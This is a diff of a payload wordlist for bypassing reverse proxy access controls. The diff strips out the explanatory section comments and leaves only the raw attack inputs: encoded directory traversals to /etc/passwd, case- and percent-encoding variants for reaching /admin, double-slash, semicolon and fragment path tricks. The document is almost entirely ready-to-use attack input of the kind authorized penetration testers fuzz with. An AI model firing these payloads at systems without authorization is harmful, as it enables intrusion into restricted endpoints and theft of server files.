@@ -1,36 +1,20 @@
-# ============================================================
-# Reverse Proxy Misconfigurations — Path Normalization
-# ============================================================
-
-# ---- Nginx Off-By-Slash ----
-# Config: location /api { proxy_pass http://backend; }
-# Missing trailing slash → path confusion
 /api../secret
 /api..%2fsecret
 /api%2f..%2fsecret
 /api/.%2fsecret
 
-# ---- Nginx Alias Traversal ----
-# Config: location /static/ { alias /var/www/static/; }
-# Attack: /static/../secret/file.txt
 /static/../etc/passwd
 /static/..%2fetc/passwd
 /static/%2e%2e/etc/passwd
 
-# ---- Apache mod_rewrite Bypass ----
-# Config: RewriteRule ^/app/(.*)$ /internal/$1
-# Attack path: append null byte or special chars
 /app%00../
 /app/.//
 /app/./
 
-# ---- Traefik Path Bypass ----
 /api/v1%2fadmin
 /api/v1%2f..%2fadmin
 /api%2fv1%2fadmin
 
-# ---- HAProxy ACL Bypass ----
-# ACL blocks /admin → bypass:
 /ADMIN
 /Admin
 /%61dmin
@@ -38,20 +22,16 @@
 /admin%0a
 /admin/
 
-# ---- Path Parameter Injection ----
 /api/user;admin=true/profile
 /api/user/profile;../admin
 
-# ---- Double Slash ----
 //admin
 //admin/secret
 /api//admin
 ///admin
 
-# ---- Semicolon Path Confusion ----
 /api/public;/../private
 /api/v1;/../../admin
 
-# ---- URL Fragment (hash) Tricks ----
 /api/public#/../admin
 /public%23/../admin
